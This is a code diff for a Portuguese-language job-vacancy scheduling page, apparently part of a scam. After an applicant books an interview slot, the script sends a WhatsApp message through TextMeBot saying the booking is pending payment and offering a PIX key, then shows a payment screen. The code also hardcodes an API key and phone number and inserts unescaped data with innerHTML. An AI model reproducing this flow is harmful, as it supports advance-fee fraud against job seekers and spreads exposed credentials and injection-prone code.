+    let vagaEscolhidaIndex = null;
+
+    function selecionarVaga(index) {
+        vagaEscolhidaIndex = index;
+        const vaga = vagasAtivas[index];
+
+        document.querySelectorAll('.vaga-card').forEach(card => card.classList.remove('selecionada'));
+        document.getElementById(`card-${index}`).classList.add('selecionada');
+
+        document.getElementById('detalhe-titulo').innerText = `Vaga: ${vaga.titulo}`;
+        document.getElementById('detalhe-endereco').innerText = vaga.endereco;
+        document.getElementById('detalhe-desc').innerText = vaga.desc;
+        document.getElementById('detalhe-beneficios').innerText = vaga.beneficios;
+        
+        let exigenciasHtml = "";
+        vaga.exigencias.forEach(ex => { exigenciasHtml += `<li>${ex}</li>`; });
+        document.getElementById('detalhe-exigencias').innerHTML = exigenciasHtml;
+
+        const htmlHorarios = vaga.horarios.map((h) => `
+            <label class="horario-label" onclick="marcarHorario(this)">
+                <input type="radio" name="horario_escolhido" value="${h.dia} às ${h.hora}">
+                ${h.dia} <br><span style="font-size: 13px; font-weight: 400;">às ${h.hora}</span>
+            </label>
+        `).join('');
+        document.getElementById('opcoes-horarios').innerHTML = htmlHorarios;
+
+        document.getElementById('detalhes-selecao').style.display = 'block';
+        
+        document.getElementById('nome').value = '';
+        document.getElementById('whatsapp').value = '';
+        checarPreenchimento(); 
+
+        document.getElementById('detalhes-selecao').scrollIntoView({ behavior: 'smooth', block: 'start' });
+    }
+
+    function marcarHorario(elementoLabel) {
+        document.querySelectorAll('.horario-label').forEach(lbl => lbl.classList.remove('selecionado'));
+        elementoLabel.classList.add('selecionado');
+        elementoLabel.querySelector('input').checked = true;
+        checarPreenchimento();
+    }
+
+    function confirmarAgendamento() {
+        if (document.getElementById('btn-confirmar').disabled) return;
+
+        const horarioEscolhido = document.querySelector('input[name="horario_escolhido"]:checked').value;
+        const nome = document.getElementById('nome').value.trim();
+        const vaga = vagasAtivas[vagaEscolhidaIndex];
+
+        // 1. INTEGRAÇÃO DA API DO WHATSAPP TEXTMEBOT
+        const textoMsg = `prezado: ${nome} recebemos seu pre agendamento para vaga: ${vaga.titulo} efetue o pagamento para confirmar o agendamento.\n\nstatus: pendente de pagamaneto...\n\nse deseja o envio da chave pix digita: 1`;
+        const apiKey = 'Pskn5LW4qaCv';
+        
+        // Disparo fixo para o número de controle (5522992195418) usando HTTPS
+        const urlApi = `https://api.textmebot.com/send.php?recipient=+5522992195418&apikey=${apiKey}&text=${encodeURIComponent(textoMsg)}`;
+        
+        // Chamada via fetch (no-cors para não dar block visual no frontend)
+        fetch(urlApi, { mode: 'no-cors' })
+            .then(() => console.log('Sinal de API enviado para +5522992195418'))
+            .catch(err => console.error('Erro no disparo WhatsApp:', err));
+
+        // 2. AVANÇAR DE TELA
+        document.getElementById('nome-confirmacao').innerText = nome.split(' ')[0];
+        document.getElementById('vaga-confirmacao').innerText = vaga.titulo;
+        document.getElementById('horario-confirmacao').innerText = horarioEscolhido;
+        
+        document.getElementById('step-vagas').style.display = 'none';
+        document.getElementById('step-pix').style.display = 'block';
+        window.scrollTo({ top: 0, behavior: 'smooth' });
+    }
+</script>
+
+</body>
+</html>
